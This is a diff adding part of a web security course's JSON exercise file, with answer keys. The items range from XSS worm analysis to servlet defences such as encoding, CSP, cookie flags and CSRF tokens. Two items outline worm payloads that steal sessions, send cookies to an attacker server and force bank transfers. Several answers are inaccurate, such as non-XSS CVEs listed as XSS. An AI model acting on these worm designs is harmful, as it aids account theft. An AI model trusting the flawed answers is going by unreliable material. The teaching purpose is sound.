+          "title": "Exercise 46: Design Your Own Worm Scenario",
+          "description": "Plan a theoretical worm for an e-commerce site.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// Target: Product review system on an online shop\n// TODO: Design the attack (theory only!):\n// Injection point: ___\n// Trigger: ___\n// Payload: ___\n// Propagation method: ___\n// Expected spread rate: ___",
+          "expected_output": "Injection: review comment field. Trigger: any user viewing the product. Payload: add fake 5-star reviews + steal session. Propagation: post worm as review on other products. Spread: exponential per product view.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Injection: review comment field. Trigger: any user viewing the product. Payload:..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Compare Worm Architectures",
+          "description": "Compare the Samy worm, BA attack, and TweetDeck worm.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the comparison table:\n//              | Samy      | BA         | TweetDeck\n// Type:        | ___       | ___        | ___\n// Spread:      | ___       | ___        | ___\n// Payload:     | ___       | ___        | ___\n// Duration:    | ___       | ___        | ___\n// Impact:      | ___       | ___        | ___",
+          "expected_output": "Samy: stored XSS, self-replicating, friend add+profile change, 20 hours, 1M profiles. BA: supply chain, no propagation, card theft, 15 days, 380K cards. TweetDeck: stored XSS, retweet-based, auto-retweet, hours, 80K retweets.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Samy: stored XSS, self-replicating, friend add+profile change, 20 hours, 1M prof..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: CVE Analysis Practice",
+          "description": "Look up and summarise a real XSS CVE.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Research one of these CVEs:\n// CVE-2021-41773 (Apache), CVE-2020-11022 (jQuery),\n// CVE-2019-11358 (jQuery Prototype Pollution)\n\n// CVE number: ___\n// Product: ___\n// Type of XSS: ___\n// CVSS Score: ___\n// How it worked: ___\n// Fix: ___",
+          "expected_output": "Research any one. Example: CVE-2020-11022 — jQuery before 3.5.0, passing HTML from untrusted sources to jQuery's DOM manipulation methods could execute scripts. CVSS 6.1. Fix: upgrade to 3.5.0+",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Research any one. Example: CVE-2020-11022 — jQuery before 3.5.0, passing HTML fr..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Attack Chain Diagram",
+          "description": "Draw the complete attack chain for a banking worm.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Fill in the chain:\n// [___] → stores in → [___]\n// ↓ victim visits page\n// [___] → executes → [___]\n// ↓ steals cookie\n// [___] → sent to → [___]\n// ↓ transfers funds  \n// [___] → POST to → [___]\n// ↓ replicates\n// [___] → writes to → [___]",
+          "expected_output": "XSS payload → database / browser → script / document.cookie → attacker server / XMLHttpRequest → /transfer / ajaxSyncRequest → victim's profile",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: XSS payload → database / browser → script / document.cookie → attacker server / ..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Risk Assessment",
+          "description": "Calculate the business impact of an XSS worm on a bank.",
+          "difficulty": "advanced",
+          "category": "Real-World Attack Analysis",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Real-World Attack Analysis! This exercise builds your understanding step by step.",
+          "starter_code": "// Bank has 100,000 active users\n// Worm steals 500$ per infected user\n// Worm spreads to 50% of users in 4 hours\n// Detection takes 6 hours\n\n// TODO: Calculate:\n// Users infected: ___\n// Total funds stolen: ___\n// Regulatory fine (estimate): ___\n// Reputation damage: ___\n// Total estimated cost: ___",
+          "expected_output": "50,000 users × $500 = $25,000,000 stolen. Fine could be 2-4% of revenue (GDPR). Reputation: loss of customer trust, potential bankruptcy. Total: potentially hundreds of millions.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 50,000 users × $500 = $25,000,000 stolen. Fine could be 2-4% of revenue (GDPR). ..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Implement Output Encoding",
+          "description": "Fix this vulnerable servlet code.",
+          "difficulty": "intermediate",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// VULNERABLE:\nout.println(\"<div>\" + userInput + \"</div>\");\n\n// TODO: Write the encoded version:\nString encoded = userInput\n    .replace(\"___\", \"&amp;\")\n    .replace(\"___\", \"&lt;\")\n    .replace(\"___\", \"&gt;\")\n    .replace(\"___\", \"&quot;\");\nout.println(\"<div>\" + encoded + \"</div>\");",
+          "expected_output": "\"&\" / \"<\" / \">\" / \"\\\"\"",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: \"&\" / \"<\" / \">\" / \"\\\"\"..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: Write a CSP Header",
+          "description": "Create a Content Security Policy that blocks inline scripts.",
+          "difficulty": "intermediate",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the CSP header:\nresponse.setHeader(\"Content-Security-Policy\",\n    \"script-src ___; \" +\n    \"style-src ___; \" +\n    \"img-src ___; \" +\n    \"default-src ___\");\n\n// What does 'self' mean? ___",
+          "expected_output": "'self' / 'self' 'unsafe-inline' / 'self' data: / 'self' — 'self' means only resources from the same origin (domain+port+protocol)",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 'self' / 'self' 'unsafe-inline' / 'self' data: / 'self' — 'self' means only reso..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: Configure Secure Cookies",
+          "description": "Set all security flags on a session cookie.",
+          "difficulty": "intermediate",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the secure cookie setup:\nCookie c = new Cookie(\"JSESSIONID\", sessionId);\nc.set___(true);     // Block JavaScript access\nc.set___(true);     // HTTPS only\nc.setMaxAge(___);   // 30-minute timeout\nc.setPath(\"___\");   // Restrict to app path\nresponse.addCookie(c);",
+          "expected_output": "HttpOnly / Secure / 1800 / /",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: HttpOnly / Secure / 1800 / /..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: CSRF Token Implementation",
+          "description": "Add CSRF protection to a transfer form.",
+          "difficulty": "intermediate",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Generate token on GET:\nprotected void doGet(...) {\n    String token = ___.randomUUID().toString();\n    session.setAttribute(\"___\", token);\n    // Include in form:\n    out.println(\"<input type='hidden' name='csrf_token' value='\" + ___ + \"'>\");\n}\n\n// Validate on POST:\nprotected void doPost(...) {\n    String submitted = req.getParameter(\"___\");\n    String expected = (String) session.getAttribute(\"___\");\n    if (!submitted.___(expected)) {\n        resp.sendError(403);\n        return;\n    }\n}",
+          "expected_output": "UUID / csrf_token / token / csrf_token / csrf_token / equals",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: UUID / csrf_token / token / csrf_token / csrf_token / equals..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Input Validation Strategy",
+          "description": "Design a whitelist-based input validator for profile descriptions.",
+          "difficulty": "intermediate",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Which approach is safer?\n// A) Blacklist: remove <script>, <img>, onerror, etc.\n// B) Whitelist: only allow [a-zA-Z0-9 .,!?'-]\n// Answer: ___\n// Why: ___\n\n// Write the whitelist validation:\nif (!description.matches(\"___\")) {\n    reject(\"Invalid characters in description\");\n}",
+          "expected_output": "B is safer — blacklists can always be bypassed with new vectors. Whitelist regex: [a-zA-Z0-9 .,!?'\\-]{1,500}",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: B is safer — blacklists can always be bypassed with new vectors. Whitelist regex..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: Security Headers Checklist",
+          "description": "List all security headers a web app should set.",
+          "difficulty": "intermediate",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the headers:\nresp.setHeader(\"Content-Security-Policy\", \"___\");\nresp.setHeader(\"X-Content-Type-Options\", \"___\");\nresp.setHeader(\"X-Frame-Options\", \"___\");\nresp.setHeader(\"X-XSS-Protection\", \"___\");\nresp.setHeader(\"Strict-Transport-Security\", \"___\");",
+          "expected_output": "script-src 'self' / nosniff / DENY / 1; mode=block / max-age=31536000; includeSubDomains",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: script-src 'self' / nosniff / DENY / 1; mode=block / max-age=31536000; includeSu..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: Defence in Depth Mapping",
+          "description": "Map each defence to which chain link it breaks.",
+          "difficulty": "intermediate",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Match defence to chain link:\n// Output encoding    breaks → ___\n// HttpOnly cookie     breaks → ___\n// CSRF token          breaks → ___\n// CSP header          breaks → ___\n// Input validation    breaks → ___\n\n// Which single defence stops the MOST attacks? ___",
+          "expected_output": "Output encoding → script injection. HttpOnly → cookie theft. CSRF token → unauthorised actions. CSP → script execution. Input validation → data storage. Output encoding stops the most — no execution = no chain.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: Output encoding → script injection. HttpOnly → cookie theft. CSRF token → unauth..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Session Regeneration",
+          "description": "Prevent session fixation by regenerating session IDs.",
+          "difficulty": "advanced",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: When should you regenerate the session ID?\n// Scenario 1: User logs in → regenerate? ___\n// Scenario 2: User changes password → regenerate? ___\n// Scenario 3: User views a product → regenerate? ___\n// Scenario 4: User elevates privileges → regenerate? ___\n\n// Java code to regenerate:\n// request.getSession().___;\n// request.getSession(___);",
+          "expected_output": "YES / YES / NO / YES / invalidate() / true (creates new session)",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: YES / YES / NO / YES / invalidate() / true (creates new session)..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Security Audit Checklist",
+          "description": "Write a checklist for auditing an app against attack chains.",
+          "difficulty": "advanced",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Complete the audit checklist:\n// [ ] Test all input fields for: ___\n// [ ] Check all cookies for: ___\n// [ ] Check all forms for: ___\n// [ ] Check response headers for: ___\n// [ ] Check error pages for: ___\n// [ ] Test session behaviour on: ___",
+          "expected_output": "XSS (stored and reflected) / HttpOnly, Secure, SameSite flags / CSRF tokens / CSP, X-Frame-Options, HSTS / information disclosure (stack traces) / login, logout, timeout, concurrent sessions",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: XSS (stored and reflected) / HttpOnly, Secure, SameSite flags / CSRF tokens / CS..."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Full Secure Servlet",
+          "description": "Write a complete servlet with ALL defences applied.",
+          "difficulty": "advanced",
+          "category": "Defence & Mitigation",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on Defence & Mitigation! This exercise builds your understanding step by step.",
+          "starter_code": "// TODO: Add all 5 defences to this transfer servlet:\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    // Defence 1: CSRF token check\n    ___\n    \n    // Defence 2: Input validation\n    String to = req.getParameter(\"to\");\n    if (!to.matches(\"___\")) { resp.sendError(400); return; }\n    \n    // Defence 3: Security headers\n    resp.setHeader(\"___\", \"___\");\n    \n    // Defence 4: Output encoding (for any response)\n    String message = \"Transfer to \" + ___;\n    \n    // Defence 5: Secure session\n    // (configured at session creation)\n}",
+          "expected_output": "1: validate csrf_token. 2: [0-9]{6} (card numbers only). 3: Content-Security-Policy, script-src 'self'. 4: Encode.forHtml(to). 5: HttpOnly+Secure cookies.",
+          "hints": [
+            {
+              "message": "Think about what each line of code does. Read the comments carefully."
+            },
+            {
+              "message": "Focus on the TODO markers — they tell you exactly what to fill in."
+            },
+            {
+              "message": "The expected answer is: 1: validate csrf_token. 2: [0-9]{6} (card numbers only). 3: Content-Security-Pol..."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
